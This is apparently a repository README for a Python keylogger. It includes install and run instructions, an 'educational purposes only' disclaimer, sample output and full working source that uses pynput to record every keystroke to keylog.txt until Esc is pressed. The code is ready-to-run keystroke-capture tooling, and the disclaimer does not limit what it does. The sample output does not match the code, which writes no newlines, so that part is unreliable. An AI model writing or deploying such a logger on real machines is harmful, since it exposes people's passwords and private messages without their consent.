Keylogger Script

Overview

This Python script logs keystrokes and saves them to a text file (keylog.txt). It uses the pynput library to capture keypresses and handles both character keys and special keys (e.g., space, enter, shift). The script stops logging when the Esc key is pressed.

Features

Captures all keystrokes (character keys and special keys).

Logs keys to a specified file (keylog.txt).

Stops logging gracefully when the Esc key is pressed.

Prerequisites

Python 3.x installed on your system.

pynput library installed. You can install it using pip:

pip install pynput

Usage Instructions

Save the script as keylogger.py.

Run the script in your terminal or command prompt:

python keylogger.py

The script will log all keystrokes to keylog.txt in the same directory.

Press the Esc key to stop the logging.

Ethical Usage

This script is intended for educational purposes only. You must comply with the following guidelines:

Authorization: Use this script only with explicit permission from the device owner.

Transparency: Inform the users and stakeholders about its use.

Legal Compliance: Ensure adherence to local laws and regulations regarding keylogging.

Disclaimer

The authors and contributors are not responsible for any misuse of this script. Misusing this script for unauthorized keylogging is illegal and unethical.

Example Output

When you type Hello World! and press the spacebar and enter key, the keylog.txt file will look like this:

H
e
l
l
o
 [Key.space]
W
o
r
l
d
!
 [Key.enter]

Technical Details

The script includes the following components:

Logging Keystrokes

The on_press function logs characters and handles special keys by wrapping them in square brackets.

Special keys like space and enter are logged as [Key.space] and [Key.enter], respectively.

Stopping Condition

The on_release function stops the script when the Esc key is pressed.

File Handling

The keystrokes are appended to keylog.txt. Ensure write permissions in the script directory.

Code

from pynput.keyboard import Key, Listener

# File to save logged keys
log_file = "keylog.txt"

# Function to log keys
def on_press(key):
    try:
        # Write the key to the log file
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Handle special keys (e.g., space, enter, shift)
        with open(log_file, "a") as f:
            f.write(f" [{key}] ")

# Stop logging when 'Esc' is pressed
def on_release(key):
    if key == Key.esc:
        return False

# Start listening for keypresses
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

License

This project is licensed under the MIT License. See the LICENSE file for details.

Contribution

Feel free to fork this repository and submit pull requests to improve the script. Ensure that your contributions adhere to ethical guidelines.

